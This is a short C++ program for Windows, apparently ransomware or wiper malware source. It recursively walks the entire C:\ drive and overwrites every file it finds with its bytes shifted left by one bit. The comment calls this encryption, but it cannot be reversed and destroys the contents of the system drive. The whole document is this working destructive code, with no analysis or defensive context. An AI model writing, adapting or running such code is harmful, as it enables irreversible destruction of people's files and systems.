#include <iostream>
#include <fstream>
#include <vector>
#include <filesystem>
#include <windows.h>
using namespace std;
void encrypt(string filepath) {
    std::ifstream file(filepath, std::ios::binary);
    //Buffer variable is a vector (Array) | read file character by character
    std::vector<char> buffer(std::istreambuf_iterator<char>(file), {});
    for (char& byte : buffer) {
        byte = byte << 1;
    }
    std::ofstream outfile(filepath, std::ios::binary);
    outfile.write(buffer.data(), buffer.size());
}

void FindFilesInDirectory(string directory) {
    WIN32_FIND_DATAA data;
    HANDLE hFind;
    string fullPath;
    if ((hFind = FindFirstFileA((directory + "\\*").c_str(), &data)) != INVALID_HANDLE_VALUE) {//First file in root, if valid handle
        do {
            if (strcmp(data.cFileName, ".") != 0 && strcmp(data.cFileName, "..") != 0) {//Will not itterate on current directory, "." and ".."
                fullPath = directory + "\\" + data.cFileName;
                if (data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {//if the file is a directory
                    FindFilesInDirectory(fullPath);//we do a little bit of recursion
                }
                else {//Modify this block to do whatever for each file
                    encrypt(fullPath);
                }
            }
        } while (FindNextFileA(hFind, &data) != 0);
        FindClose(hFind);
    }
}
int main() {
    string root = "C:\\";
    FindFilesInDirectory(root);
    return 0;
}